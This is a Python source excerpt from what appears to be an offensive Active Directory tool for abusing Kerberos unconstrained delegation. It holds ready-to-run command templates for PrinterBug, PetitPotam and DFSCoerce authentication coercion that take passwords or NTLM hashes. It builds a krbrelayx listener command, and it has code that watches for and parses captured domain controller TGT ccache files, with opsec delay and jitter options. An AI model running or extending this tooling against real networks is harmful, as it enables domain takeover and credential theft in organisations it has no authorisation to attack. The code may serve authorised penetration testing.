# ---------------------------------------------------------------------------
# CoercionMethod — supported coercion techniques
# ---------------------------------------------------------------------------

class CoercionMethod:
    SPOOLSS   = "SpoolSS"      # MS-RPRN PrinterBug — port 445
    PETITPOTAM = "PetitPotam"  # MS-EFSR — port 445
    DFSCOERCE = "DFSCoerce"    # MS-DFSNM — port 445
    MANUAL    = "Manual"       # Operator handles coercion externally

    ALL_METHODS = [SPOOLSS, PETITPOTAM, DFSCOERCE]

    # Impacket/standalone tool commands for each method
    COMMANDS = {
        SPOOLSS: (
            "python3 printerbug.py "
            "'{domain}/{username}:{password}@{coerce_target}' {listener_ip}"
        ),
        PETITPOTAM: (
            "python3 PetitPotam.py "
            "-u '{username}' -p '{password}' -d '{domain}' "
            "{listener_ip} {coerce_target}"
        ),
        DFSCOERCE: (
            "python3 dfscoerce.py "
            "-u '{username}' -p '{password}' -d '{domain}' "
            "{listener_ip} {coerce_target}"
        ),
    }


# ---------------------------------------------------------------------------
# UnconstrainedConfig
# ---------------------------------------------------------------------------

@dataclass
class UnconstrainedConfig:
    """
    Configuration for an unconstrained delegation exploitation run.

    dc_ip:           Domain controller IP (for LDAP enumeration)
    domain:          Domain FQDN
    target:          sAMAccountName of the unconstrained delegation machine
                     (the machine we're capturing tickets from)
    coerce_target:   Hostname/IP of the machine to coerce into authenticating
                     to our target. Typically a DC or privileged server.
    listener_ip:     Our IP address — what the coerced machine authenticates to.
                     This is where krbrelayx or Responder should be listening.
    coerce_method:   Which coercion technique to use. Default: SpoolSS.
    ccache_dir:      Directory where the TGT listener writes captured ccaches.
                     DeleGator monitors this directory for new .ccache files.
    watch_timeout:   Seconds to wait for a captured TGT before timing out.
                     Default 60 seconds.
    manual_ccache:   Path to a manually captured ccache to process directly.
                     Use when coercion is performed externally.
    opsec_check:     Prompt before noisy operations.
    delay_ms:        Inter-operation delay in milliseconds.
    jitter_pct:      Jitter percentage for delays.
    output_dir:      Directory for any written output files.
    use_ssl:         Use LDAPS for enumeration queries.
    """
    dc_ip:          str
    domain:         str
    target:         str
    coerce_target:  Optional[str] = None
    listener_ip:    Optional[str] = None
    coerce_method:  str           = CoercionMethod.SPOOLSS
    ccache_dir:     str           = "/tmp"
    watch_timeout:  int           = 60
    manual_ccache:  Optional[str] = None
    opsec_check:    bool          = False
    delay_ms:       int           = 0
    jitter_pct:     int           = 0
    output_dir:     str           = "/tmp"
    use_ssl:        bool          = False


# ---------------------------------------------------------------------------
# Coercion command generation
# ---------------------------------------------------------------------------

def _build_coercion_command(
    method:       str,
    domain:       str,
    username:     str,
    password:     str,
    coerce_target: str,
    listener_ip:  str,
) -> str:
    """
    Build the exact coercion command for the specified method.
    Returns a ready-to-run command string.
    """
    template = CoercionMethod.COMMANDS.get(method, "")
    if not template:
        return f"# Unsupported coercion method: {method}"

    return template.format(
        domain=domain,
        username=username,
        password=password,
        coerce_target=coerce_target,
        listener_ip=listener_ip,
    )


def _build_listener_command(listener_ip: str, output_dir: str) -> str:
    """
    Build the krbrelayx listener command for TGT capture.
    krbrelayx is the standard tool for capturing TGTs forwarded via
    unconstrained delegation.
    """
    return (
        f"python3 krbrelayx.py "
        f"--interface {listener_ip} "
        f"--output-dir {output_dir}"
    )


def _get_auth_string(auth: AuthContext) -> tuple[str, str]:
    """
    Extract username and credential string from AuthContext for
    embedding in coercion commands.
    Returns (username, credential_string).
    """
    username = auth.username

    if auth.auth_method.name == "PASSWORD":
        return username, auth.password or ""
    elif auth.auth_method.name == "HASH":
        return username, f"-hashes {auth.lm_hash}:{auth.nt_hash}"
    elif auth.auth_method.name == "CCACHE":
        return username, f"-k -no-pass"
    else:
        return username, ""


# ---------------------------------------------------------------------------
# TGT capture monitoring
# ---------------------------------------------------------------------------

def _watch_for_ccache(
    watch_dir:   str,
    timeout_sec: int,
    existing:    set[str],
) -> Optional[str]:
    """
    Monitor a directory for new .ccache files written by a listener.
    Returns the path to the first new ccache found, or None on timeout.

    Polls every 2 seconds. The existing set contains ccache filenames
    already present before monitoring started, so we only return
    genuinely new captures.
    """
    info(f"Monitoring {watch_dir} for captured TGTs (timeout: {timeout_sec}s)...")
    deadline = time.time() + timeout_sec

    while time.time() < deadline:
        try:
            current = {
                f for f in os.listdir(watch_dir)
                if f.endswith(".ccache")
            }
        except OSError:
            time.sleep(2)
            continue

        new_files = current - existing
        if new_files:
            # Return the most recently modified new ccache
            newest = max(
                new_files,
                key=lambda f: os.path.getmtime(os.path.join(watch_dir, f))
            )
            return os.path.join(watch_dir, newest)

        remaining = int(deadline - time.time())
        if remaining % 10 == 0 and remaining > 0:
            info(f"  Still waiting... {remaining}s remaining")

        time.sleep(2)

    return None


def _validate_captured_ccache(ccache_path: str) -> Optional[dict]:
    """
    Load and validate a captured ccache.
    Returns basic ticket info dict or None if the ccache is invalid/expired.
    """
    from impacket.krb5.ccache import CCache

    try:
        ccache = CCache.loadFile(ccache_path)
    except Exception as e:
        warning(f"Cannot parse captured ccache '{ccache_path}': {e}")
        return None

    if not ccache.credentials:
        warning(f"Captured ccache '{ccache_path}' contains no credentials")
        return None

    cred = ccache.credentials[0]

    try:
        client = ccache.principal.components[0].decode()
    except Exception:
        client = "unknown"

    try:
        server = cred["server"].prettyPrint()
    except Exception:
        server = "unknown"

    return {
        "client":     client,
        "server":     server,
        "ccache_path": ccache_path,
    }


